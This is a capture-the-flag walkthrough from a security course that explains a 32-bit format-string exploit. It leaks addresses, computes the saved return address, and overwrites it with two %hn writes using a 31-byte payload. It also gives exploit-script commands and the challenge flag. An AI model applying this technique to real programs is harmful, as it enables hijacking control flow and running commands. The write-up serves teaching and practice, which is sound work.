# formatstring4 Walkthrough (Hand-First)

## Verified Flag First

`cosc466-flag-{u3VyuWnP8GU3cHbnrCFu}`

This was retrieved from the remote service before this walkthrough was finalized.

## Fast Start

If you just want the easiest command that still shows all hand-calculation values:

```bash
cd /home/jbenjam7/cs466/ctf/formatstring4
/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py remote
```

Helper script path: `ctf/formatstring4/exploit_easy.py`

It prints:
- leaked addresses
- return address math
- high/low halfwords
- paddings
- payload length

Then it sends the payload in the same connection.

---

## Hand Walkthrough

### 1. Read the leaks

The program leaks two values:
- `jump` address (target function)
- `buffer` address (stack location of your input)

Example from live run:
- `jump = 0x080491a6`
- `buffer = 0xffffdc3c`

### 2. Compute saved return address

From the source behavior, saved RET is at:

`ret_addr = buffer_addr + 48`

Example:
- `ret_addr = 0xffffdc3c + 0x30 = 0xffffdc6c`

### 3. Split target into two halfwords

Target is `0x080491a6`:
- `high = 0x0804 = 2052`
- `low  = 0x91a6 = 37286`

### 4. Choose write destinations

Use two `%hn` writes:
- write `high` to `ret_addr + 2`
- write `low` to `ret_addr`

So:
- `addr1 = ret_addr + 2 = 0xffffdc6e`
- `addr2 = ret_addr     = 0xffffdc6c`

### 5. Compute paddings

First 8 bytes printed are the two packed addresses.

- already printed = 8
- `pad1 = high - 8 = 2052 - 8 = 2044`
- `pad2 = low - high = 37286 - 2052 = 35234`

Format part:

`%2044c%1$hn%35234c%2$hn`

### 6. Final payload layout

Payload must be exactly 31 bytes:

- 8 bytes: `addr1` + `addr2` (little-endian packed)
- 23 bytes: format string

Total: `8 + 23 = 31`

### 7. Why pure shell is painful here

This challenge has ASLR and requires leak + payload in one live session.
You can do the math by hand, but binary packing and raw-byte send are awkward in pure shell.

Practical approach:
- Do all reasoning/math by hand
- Use a tiny script only for byte packing and send

---

## What `%hn` Is Doing

`%hn` writes the lower 16 bits of printf's character count to the address pointed to by that stack argument.

So in this payload:
- `%1$hn` writes the current count to `addr1`
- `%2$hn` writes the current count to `addr2`

The `%Nc` specifiers are how you move the count to the exact values you want.

---

## Minimal Easy Script Usage

Local:

```bash
cd /home/jbenjam7/cs466/ctf/formatstring4
/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py local
```

Remote:

```bash
cd /home/jbenjam7/cs466/ctf/formatstring4
/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py remote
```

Optional custom command:

```bash
/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py remote --cmd "id\nexit\n"
```

---

## Sanity Checks

If it fails, verify these first:
1. `ret_addr = buffer + 48` is correct for this binary.
2. `high` and `low` are split correctly from `jump`.
3. `pad1` and `pad2` are computed from character counts.
4. Payload length is exactly 31.
5. Addresses are little-endian in the payload.
